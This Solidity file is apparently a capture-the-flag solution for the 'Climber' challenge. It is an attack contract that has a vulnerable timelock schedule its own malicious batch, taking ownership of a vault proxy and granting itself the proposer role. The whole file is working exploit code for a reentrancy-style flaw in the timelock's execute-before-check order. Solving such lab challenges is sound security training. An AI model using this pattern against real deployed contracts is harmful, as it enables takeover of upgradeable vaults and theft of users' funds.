// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ERC1967Proxy} from "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";

contract AttackScheduler {
    ClimberTimelock private climberTimelock;
    ERC1967Proxy private climberVaultProxy;
    address private attacker;

    constructor(address _climberTimelock, address _climberVaultProxy) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
        climberVaultProxy = ERC1967Proxy(payable(_climberVaultProxy));
        attacker = msg.sender;
    }

    function schedule() external {
        require(msg.sender == address(climberTimelock), "only timelock can call this function");

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        targets[0] = address(climberVaultProxy);
        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(attacker)));

        targets[1] = address(climberTimelock);
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (keccak256("PROPOSER_ROLE"), address(this)));

        targets[2] = address(this);
        dataElements[2] = abi.encodeCall(this.schedule, ());

        climberTimelock.schedule(targets, values, dataElements, 0);
    }
}
